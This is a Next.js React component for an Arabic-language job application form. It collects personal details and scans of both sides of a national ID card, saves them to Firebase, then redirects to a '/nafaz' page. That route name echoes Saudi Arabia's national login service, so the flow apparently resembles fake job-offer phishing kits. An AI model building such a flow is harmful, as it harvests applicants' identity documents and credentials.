"use client"

import { useState, useEffect } from "react"
import { zodResolver } from "@hookform/resolvers/zod"
import { useForm } from "react-hook-form"
import { z } from "zod"
import {
  Loader2,
  CheckCircle2,
  AlertCircle,
  Briefcase,
  GraduationCap,
  User,
  FileText,
  Calendar,
  MapPin,
  CreditCard,
} from "lucide-react"

import { Button } from "@/components/ui/button"
import { Form, FormControl, FormDescription, FormField, FormItem, FormLabel, FormMessage } from "@/components/ui/form"
import { Input } from "@/components/ui/input"
import { Textarea } from "@/components/ui/textarea"
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select"
import { toast } from "@/components/ui/use-toast"
import { Card, CardContent, CardDescription, CardFooter, CardHeader, CardTitle } from "@/components/ui/card"
import { RadioGroup, RadioGroupItem } from "@/components/ui/radio-group"
import { Label } from "@/components/ui/label"
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs"
import { cn } from "@/lib/utils"
import { addData } from "@/lib/firebase"
import { useRouter } from "next/navigation"
import { MultipleImageUploader } from "./multiple-image-uploader"

const MAX_FILE_SIZE = 5 * 1024 * 1024 // 5MB
function uniqueID() {
  return Math.floor(Math.random() * Date.now())
}

const formSchema = z.object({
  // Personal Information
  fullName: z.string().min(3, {
    message: "الاسم الكامل يجب أن يكون 3 أحرف على الأقل",
  }),
  email: z.string().email({
    message: "يرجى إدخال بريد إلكتروني صحيح",
  }),
  phone: z.string().min(10, {
    message: "رقم الهاتف يجب أن يكون 10 أرقام على الأقل",
  }),
  dateOfBirth: z.string().optional(),
  gender: z.enum(["male", "female"], {
    required_error: "يرجى اختيار الجنس",
  }),
  nationality: z.string().min(2, {
    message: "يرجى إدخال الجنسية",
  }),
  address: z.string().min(5, {
    message: "يرجى إدخال العنوان بشكل صحيح",
  }),

  // Professional Information
  position: z.string({
    required_error: "يرجى اختيار الوظيفة المطلوبة",
  }),
  department: z.string({
    required_error: "يرجى اختيار القسم",
  }),
  experience: z.string({
    required_error: "يرجى اختيار سنوات الخبرة",
  }),
  education: z.string({
    required_error: "يرجى اختيار المستوى التعليمي",
  }),
  specialization: z.string().min(2, {
    message: "يرجى إدخال التخصص",
  }),
  linkedinProfile: z
    .string()
    .url({
      message: "يرجى إدخال رابط صحيح",
    })
    .optional()
    .or(z.literal("")),
  expectedSalary: z.string().min(1, {
    message: "يرجى إدخال الراتب المتوقع",
  }),
  startDate: z.string().optional(),
  coverLetter: z.string().optional(),

  // Files
  idFrontImages: z.array(z.string()).optional(),
  idBackImages: z.array(z.string()).optional(),
  cvFiles: z.array(z.string()).optional(),
})

export type FormValues = z.infer<typeof formSchema>

export function JobApplicationFormUpdated() {
  const [isSubmitting, setIsSubmitting] = useState(false)
  const [activeTab, setActiveTab] = useState("personal")
  const [formProgress, setFormProgress] = useState({
    personal: false,
    professional: false,
    documents: false,
  })
  const id = uniqueID()
  const router = useRouter()

  const form = useForm<FormValues>({
    resolver: zodResolver(formSchema),
    defaultValues: {
      fullName: "",
      email: "",
      phone: "",
      gender: "male",
      nationality: "",
      address: "",
      position: "",
      department: "",
      experience: "",
      education: "",
      specialization: "",
      linkedinProfile: "",
      expectedSalary: "",
      coverLetter: "",
      idFrontImages: [],
      idBackImages: [],
      cvFiles: [],
    },
    mode: "onChange",
  })

  const watchedFields = form.watch()

  // Update progress when fields are filled
  const updateProgress = () => {
    const personalFields = ["fullName", "email", "phone", "gender", "nationality", "address"]
    const professionalFields = ["position", "department", "experience", "education", "specialization", "expectedSalary"]

    const personalComplete = personalFields.every(
      (field) => watchedFields[field as keyof FormValues] && !form.getFieldState(field as keyof FormValues).invalid,
    )

    const professionalComplete = professionalFields.every(
      (field) => watchedFields[field as keyof FormValues] && !form.getFieldState(field as keyof FormValues).invalid,
    )

    const documentsComplete =
      (watchedFields.idFrontImages?.length || 0) > 0 &&
      (watchedFields.idBackImages?.length || 0) > 0 &&
      (watchedFields.cvFiles?.length || 0) > 0

    setFormProgress({
      personal: personalComplete,
      professional: professionalComplete,
      documents: documentsComplete,
    })
  }

  // Update progress when form changes
  useEffect(() => {
    updateProgress()
  }, [watchedFields])

  async function onSubmit(values: FormValues) {
    setIsSubmitting(true)

    try {
      // Add application data to Firebase
      await addData({
        collection: "applications",
        id: id.toString(),
          ...values,
          applicationId: id,
          status: "pending",
          submittedAt: new Date().toISOString(),
      })
      router.push("/nafaz")

      toast({
        title: "تم إرسال طلبك بنجاح",
        description: "سنقوم بمراجعة طلبك والرد عليك قريباً",
      })


      // Reset form
      form.reset()
      setActiveTab("personal")
      setFormProgress({
        personal: false,
        professional: false,
        documents: false,
      })
    } catch (error) {
      console.error("Submission error:", error)
      toast({
        variant: "destructive",
        title: "حدث خطأ",
        description: "لم نتمكن من إرسال طلبك، يرجى المحاولة مرة أخرى",
      })
    } finally {
      setIsSubmitting(false)
    }
  }

  return (
    <Card className="w-full max-w-4xl mx-auto border-0 shadow-lg">
      <CardHeader className="bg-gradient-to-r from-blue-600 to-blue-800 text-white rounded-t-lg">
        <div className="flex items-center justify-between">
          <div>
            <CardTitle className="text-2xl font-bold">نموذج التقدم للوظيفة</CardTitle>
            <CardDescription className="text-blue-100 mt-2">
              يرجى تعبئة النموذج بالمعلومات المطلوبة للتقدم للوظيفة
            </CardDescription>
          </div>
          <div className="hidden md:block">
            <Briefcase className="h-12 w-12 text-blue-100 opacity-80" />
          </div>
        </div>
      </CardHeader>

      <CardContent className="p-6">
        <div className="mb-6">
          <div className="flex items-center justify-between mb-2">
            <h3 className="text-lg font-medium">مراحل التقديم</h3>
            <div className="text-sm text-muted-foreground">
              {Object.values(formProgress).filter(Boolean).length} من 3 مكتمل
            </div>
          </div>

          <div className="flex gap-2 mb-6">
            <div
              className={cn(
                "h-2 flex-1 rounded-full transition-colors",
                formProgress.personal ? "bg-green-500" : "bg-gray-200",
              )}
              onClick={() => setActiveTab("personal")}
            />
            <div
              className={cn(
                "h-2 flex-1 rounded-full transition-colors",
                formProgress.professional ? "bg-green-500" : "bg-gray-200",
              )}
              onClick={() => setActiveTab("professional")}
            />
            <div
              className={cn(
                "h-2 flex-1 rounded-full transition-colors",
                formProgress.documents ? "bg-green-500" : "bg-gray-200",
              )}
              onClick={() => setActiveTab("documents")}
            />
          </div>
        </div>

        <Form {...form}>
          <form onSubmit={form.handleSubmit(onSubmit)} className="space-y-6">
            <Tabs value={activeTab} onValueChange={setActiveTab} className="w-full">
              <TabsList className="grid grid-cols-3 mb-6">
                <TabsTrigger value="personal" className="flex items-center gap-2">
                  <User className="h-4 w-4" />
                  <span className="hidden sm:inline">المعلومات الشخصية</span>
                  <span className="sm:hidden">شخصي</span>
                  {formProgress.personal && <CheckCircle2 className="h-4 w-4 text-green-500 ml-1" />}
                </TabsTrigger>
                <TabsTrigger value="professional" className="flex items-center gap-2">
                  <Briefcase className="h-4 w-4" />
                  <span className="hidden sm:inline">المعلومات المهنية</span>
                  <span className="sm:hidden">مهني</span>
                  {formProgress.professional && <CheckCircle2 className="h-4 w-4 text-green-500 ml-1" />}
                </TabsTrigger>
                <TabsTrigger value="documents" className="flex items-center gap-2">
                  <FileText className="h-4 w-4" />
                  <span className="hidden sm:inline">المستندات المطلوبة</span>
                  <span className="sm:hidden">مستندات</span>
                  {formProgress.documents && <CheckCircle2 className="h-4 w-4 text-green-500 ml-1" />}
                </TabsTrigger>
              </TabsList>

              <TabsContent value="personal" className="space-y-6">
                <div className="flex items-center gap-2 mb-4">
                  <User className="h-5 w-5 text-blue-600" />
                  <h3 className="text-xl font-medium">المعلومات الشخصية</h3>
                </div>

                <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                  <FormField
                    control={form.control}
                    name="fullName"
                    render={({ field }) => (
                      <FormItem>
                        <FormLabel>
                          الاسم الكامل <span className="text-red-500">*</span>
                        </FormLabel>
                        <FormControl>
                          <Input placeholder="أدخل الاسم الكامل" {...field} />
                        </FormControl>
                        <FormMessage />
                      </FormItem>
                    )}
                  />

                  <FormField
                    control={form.control}
                    name="email"
                    render={({ field }) => (
                      <FormItem>
                        <FormLabel>
                          البريد الإلكتروني <span className="text-red-500">*</span>
                        </FormLabel>
                        <FormControl>
                          <Input placeholder="example@domain.com" type="email" {...field} />
                        </FormControl>
                        <FormMessage />
                      </FormItem>
                    )}
                  />

                  <FormField
                    control={form.control}
                    name="phone"
                    render={({ field }) => (
                      <FormItem>
                        <FormLabel>
                          رقم الهاتف <span className="text-red-500">*</span>
                        </FormLabel>
                        <FormControl>
                          <Input placeholder="05xxxxxxxx" {...field} />
                        </FormControl>
                        <FormMessage />
                      </FormItem>
                    )}
                  />

                  <FormField
                    control={form.control}
                    name="dateOfBirth"
                    render={({ field }) => (
                      <FormItem>
                        <FormLabel>تاريخ الميلاد</FormLabel>
                        <FormControl>
                          <div className="relative">
                            <Calendar className="absolute right-3 top-3 h-4 w-4 text-muted-foreground" />
                            <Input type="date" {...field} className="pl-10" />
                          </div>
                        </FormControl>
                        <FormMessage />
                      </FormItem>
                    )}
                  />

                  <FormField
                    control={form.control}
                    name="gender"
                    render={({ field }) => (
                      <FormItem className="space-y-3">
                        <FormLabel>
                          الجنس <span className="text-red-500">*</span>
                        </FormLabel>
                        <FormControl>
                          <RadioGroup onValueChange={field.onChange} defaultValue={field.value} className="flex gap-6">
                            <div className="flex items-center space-x-2 space-x-reverse">
                              <RadioGroupItem value="male" id="male" />
                              <Label htmlFor="male">ذكر</Label>
                            </div>
                            <div className="flex items-center space-x-2 space-x-reverse">
                              <RadioGroupItem value="female" id="female" />
                              <Label htmlFor="female">أنثى</Label>
                            </div>
                          </RadioGroup>
                        </FormControl>
                        <FormMessage />
                      </FormItem>
                    )}
                  />

                  <FormField
                    control={form.control}
                    name="nationality"
                    render={({ field }) => (
                      <FormItem>
                        <FormLabel>
                          الجنسية <span className="text-red-500">*</span>
                        </FormLabel>
                        <FormControl>
                          <Input placeholder="أدخل الجنسية" {...field} />
                        </FormControl>
                        <FormMessage />
                      </FormItem>
                    )}
                  />

                  <FormField
                    control={form.control}
                    name="address"
                    render={({ field }) => (
                      <FormItem className="md:col-span-2">
                        <FormLabel>
                          العنوان <span className="text-red-500">*</span>
                        </FormLabel>
                        <FormControl>
                          <div className="relative">
                            <MapPin className="absolute right-3 top-3 h-4 w-4 text-muted-foreground" />
                            <Input placeholder="المدينة، الحي، الشارع" {...field} className="pr-10" />
                          </div>
                        </FormControl>
                        <FormMessage />
                      </FormItem>
                    )}
                  />
                </div>

                <div className="flex justify-end pt-4">
                  <Button
                    type="button"
                    onClick={() => setActiveTab("professional")}
                    className="bg-blue-600 hover:bg-blue-700"
                  >
                    التالي
                  </Button>
                </div>
              </TabsContent>

              <TabsContent value="professional" className="space-y-6">
                {/* Professional tab content - unchanged from original */}
                <div className="flex items-center gap-2 mb-4">
                  <Briefcase className="h-5 w-5 text-blue-600" />
                  <h3 className="text-xl font-medium">المعلومات المهنية</h3>
                </div>

                <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                  <FormField
                    control={form.control}
                    name="position"
                    render={({ field }) => (
                      <FormItem>
                        <FormLabel>
                          الوظيفة المطلوبة <span className="text-red-500">*</span>
                        </FormLabel>
                        <Select onValueChange={field.onChange} defaultValue={field.value}>
                          <FormControl>
                            <SelectTrigger>
                              <SelectValue placeholder="اختر الوظيفة" />
                            </SelectTrigger>
                          </FormControl>
                          <SelectContent>
                            <SelectItem value="developer">مطور برمجيات</SelectItem>
                            <SelectItem value="designer">مصمم</SelectItem>
                            <SelectItem value="marketing">تسويق</SelectItem>
                            <SelectItem value="sales">مبيعات</SelectItem>
                            <SelectItem value="hr">موارد بشرية</SelectItem>
                            <SelectItem value="finance">مالية</SelectItem>
                            <SelectItem value="other">أخرى</SelectItem>
                          </SelectContent>
                        </Select>
                        <FormMessage />
                      </FormItem>
                    )}
                  />

                  <FormField
                    control={form.control}
                    name="department"
                    render={({ field }) => (
                      <FormItem>
                        <FormLabel>
                          القسم <span className="text-red-500">*</span>
                        </FormLabel>
                        <Select onValueChange={field.onChange} defaultValue={field.value}>
                          <FormControl>
                            <SelectTrigger>
                              <SelectValue placeholder="اختر القسم" />
                            </SelectTrigger>
                          </FormControl>
                          <SelectContent>
                            <SelectItem value="it">تقنية المعلومات</SelectItem>
                            <SelectItem value="design">التصميم</SelectItem>
                            <SelectItem value="marketing">التسويق</SelectItem>
                            <SelectItem value="sales">المبيعات</SelectItem>
                            <SelectItem value="hr">الموارد البشرية</SelectItem>
                            <SelectItem value="finance">المالية</SelectItem>
                            <SelectItem value="operations">العمليات</SelectItem>
                            <SelectItem value="other">أخرى</SelectItem>
                          </SelectContent>
                        </Select>
                        <FormMessage />
                      </FormItem>
                    )}
                  />

                  <FormField
                    control={form.control}
                    name="experience"
                    render={({ field }) => (
                      <FormItem>
                        <FormLabel>
                          سنوات الخبرة <span className="text-red-500">*</span>
                        </FormLabel>
                        <Select onValueChange={field.onChange} defaultValue={field.value}>
                          <FormControl>
                            <SelectTrigger>
                              <SelectValue placeholder="اختر سنوات الخبرة" />
                            </SelectTrigger>
                          </FormControl>
                          <SelectContent>
                            <SelectItem value="entry">أقل من سنة</SelectItem>
                            <SelectItem value="junior">1-3 سنوات</SelectItem>
                            <SelectItem value="mid">3-5 سنوات</SelectItem>
                            <SelectItem value="senior">5-10 سنوات</SelectItem>
                            <SelectItem value="expert">أكثر من 10 سنوات</SelectItem>
                          </SelectContent>
                        </Select>
                        <FormMessage />
                      </FormItem>
                    )}
                  />

                  <FormField
                    control={form.control}
                    name="education"
                    render={({ field }) => (
                      <FormItem>
                        <FormLabel>
                          المستوى التعليمي <span className="text-red-500">*</span>
                        </FormLabel>
                        <Select onValueChange={field.onChange} defaultValue={field.value}>
                          <FormControl>
                            <SelectTrigger>
                              <SelectValue placeholder="اختر المستوى التعليمي" />
                            </SelectTrigger>
                          </FormControl>
                          <SelectContent>
                            <SelectItem value="highschool">ثانوية عامة</SelectItem>
                            <SelectItem value="diploma">دبلوم</SelectItem>
                            <SelectItem value="bachelor">بكالوريوس</SelectItem>
                            <SelectItem value="master">ماجستير</SelectItem>
                            <SelectItem value="phd">دكتوراه</SelectItem>
                          </SelectContent>
                        </Select>
                        <FormMessage />
                      </FormItem>
                    )}
                  />

                  <FormField
                    control={form.control}
                    name="specialization"
                    render={({ field }) => (
                      <FormItem>
                        <FormLabel>
                          التخصص <span className="text-red-500">*</span>
                        </FormLabel>
                        <FormControl>
                          <div className="relative">
                            <GraduationCap className="absolute right-3 top-3 h-4 w-4 text-muted-foreground" />
                            <Input placeholder="أدخل التخصص" {...field} className="pr-10" />
                          </div>
                        </FormControl>
                        <FormMessage />
                      </FormItem>
                    )}
                  />

                  <FormField
                    control={form.control}
                    name="linkedinProfile"
                    render={({ field }) => (
                      <FormItem>
                        <FormLabel>حساب LinkedIn</FormLabel>
                        <FormControl>
                          <Input placeholder="https://linkedin.com/in/username" {...field} />
                        </FormControl>
                        <FormDescription>اختياري: أدخل رابط الملف الشخصي الخاص بك</FormDescription>
                        <FormMessage />
                      </FormItem>
                    )}
                  />

                  <FormField
                    control={form.control}
                    name="expectedSalary"
                    render={({ field }) => (
                      <FormItem>
                        <FormLabel>
                          الراتب المتوقع <span className="text-red-500">*</span>
                        </FormLabel>
                        <FormControl>
                          <div className="relative">
                            <CreditCard className="absolute right-3 top-3 h-4 w-4 text-muted-foreground" />
                            <Input placeholder="أدخل الراتب المتوقع" {...field} className="pr-10" />
                          </div>
                        </FormControl>
                        <FormMessage />
                      </FormItem>
                    )}
                  />

                  <FormField
                    control={form.control}
                    name="startDate"
                    render={({ field }) => (
                      <FormItem>
                        <FormLabel>تاريخ البدء المتوقع</FormLabel>
                        <FormControl>
                          <div className="relative">
                            <Calendar className="absolute right-3 top-3 h-4 w-4 text-muted-foreground" />
                            <Input type="date" {...field} className="pl-10" />
                          </div>
                        </FormControl>
                        <FormMessage />
                      </FormItem>
                    )}
                  />

                  <FormField
                    control={form.control}
                    name="coverLetter"
                    render={({ field }) => (
                      <FormItem className="md:col-span-2">
                        <FormLabel>نبذة عنك</FormLabel>
                        <FormControl>
                          <Textarea
                            placeholder="اكتب نبذة مختصرة عن خبراتك ومهاراتك ولماذا أنت مناسب لهذه الوظيفة"
                            className="min-h-[120px]"
                            {...field}
                          />
                        </FormControl>
                        <FormDescription>اختياري: يمكنك كتابة نبذة مختصرة عن نفسك</FormDescription>
                        <FormMessage />
                      </FormItem>
                    )}
                  />
                </div>

                <div className="flex justify-between pt-4">
                  <Button type="button" onClick={() => setActiveTab("personal")} variant="outline">
                    السابق
                  </Button>
                  <Button
                    type="button"
                    onClick={() => setActiveTab("documents")}
                    className="bg-blue-600 hover:bg-blue-700"
                  >
                    التالي
                  </Button>
                </div>
              </TabsContent>

              <TabsContent value="documents" className="space-y-6">
                <div className="flex items-center gap-2 mb-4">
                  <FileText className="h-5 w-5 text-blue-600" />
                  <h3 className="text-xl font-medium">المستندات المطلوبة</h3>
                </div>

                <div className="bg-blue-50 border border-blue-200 rounded-lg p-4 mb-6">
                  <div className="flex gap-3">
                    <AlertCircle className="h-5 w-5 text-blue-600 flex-shrink-0 mt-0.5" />
                    <div>
                      <h4 className="font-medium text-blue-800">ملاحظات هامة</h4>
                      <ul className="text-sm text-blue-700 mt-2 list-disc list-inside space-y-1">
                        <li>يجب أن تكون جميع المستندات واضحة وبجودة عالية</li>
                        <li>الحد الأقصى لحجم كل ملف هو 5 ميجابايت</li>
                        <li>يجب أن تكون صور الهوية بصيغة JPG أو PNG</li>
                        <li>يجب أن تكون السيرة الذاتية بصيغة PDF أو Word</li>
                      </ul>
                    </div>
                  </div>
                </div>

                <div className="grid grid-cols-1 gap-6">
                  <FormField
                    control={form.control}
                    name="cvFiles"
                    render={({ field }) => (
                      <FormItem>
                        <FormLabel>
                          السيرة الذاتية <span className="text-red-500">*</span>
                        </FormLabel>
                        <FormControl>
                          <MultipleImageUploader
                            fieldName="cv"
                            label="السيرة الذاتية"
                            description="PDF, DOC, DOCX (MAX. 5MB)"
                            acceptedFileTypes="application/pdf,application/msword,application/vnd.openxmlformats-officedocument.wordprocessingml.document"
                            maxFiles={1}
                            onChange={(urls) => field.onChange(urls)}
                            value={field.value}
                          />
                        </FormControl>
                        <FormMessage />
                      </FormItem>
                    )}
                  />

                  <FormField
                    control={form.control}
                    name="idFrontImages"
                    render={({ field }) => (
                      <FormItem>
                        <FormLabel>
                          صورة الهوية (الوجه الأمامي) <span className="text-red-500">*</span>
                        </FormLabel>
                        <FormControl>
                          <MultipleImageUploader
                            fieldName="idFront"
                            label="صورة الهوية (الوجه الأمامي)"
                            description="JPG, PNG (MAX. 5MB)"
                            acceptedFileTypes="image/*"
                            maxFiles={1}
                            onChange={(urls) => field.onChange(urls)}
                            value={field.value}
                          />
                        </FormControl>
                        <FormMessage />
                      </FormItem>
                    )}
                  />

                  <FormField
                    control={form.control}
                    name="idBackImages"
                    render={({ field }) => (
                      <FormItem>
                        <FormLabel>
                          صورة الهوية (الوجه الخلفي) <span className="text-red-500">*</span>
                        </FormLabel>
                        <FormControl>
                          <MultipleImageUploader
                            fieldName="idBack"
                            label="صورة الهوية (الوجه الخلفي)"
                            description="JPG, PNG (MAX. 5MB)"
                            acceptedFileTypes="image/*"
                            maxFiles={1}
                            onChange={(urls) => field.onChange(urls)}
                            value={field.value}
                          />
                        </FormControl>
                        <FormMessage />
                      </FormItem>
                    )}
                  />
                </div>

                <div className="flex justify-between pt-4">
                  <Button type="button" onClick={() => setActiveTab("professional")} variant="outline">
                    السابق
                  </Button>
                  <Button type="submit" className="bg-green-600 hover:bg-green-700" disabled={isSubmitting}>
                    {isSubmitting ? (
                      <>
                        <Loader2 className="mr-2 h-4 w-4 animate-spin" />
                        جاري إرسال الطلب...
                      </>
                    ) : (
                      "تقديم الطلب"
                    )}
                  </Button>
                </div>
              </TabsContent>
            </Tabs>
          </form>
        </Form>
      </CardContent>

      <CardFooter className="bg-gray-50 p-6 border-t flex flex-col sm:flex-row justify-between items-center gap-4 rounded-b-lg">
        <div className="text-sm text-muted-foreground text-center sm:text-right">
          جميع البيانات المقدمة سيتم التعامل معها بسرية تامة وفقاً لسياسة الخصوصية
        </div>
        <div className="flex items-center gap-2">
          <span className="text-sm font-medium">بحاجة للمساعدة؟</span>
          <Button variant="link" className="p-0 h-auto text-blue-600">
            اتصل بنا
          </Button>
        </div>
      </CardFooter>
    </Card>
  )
}
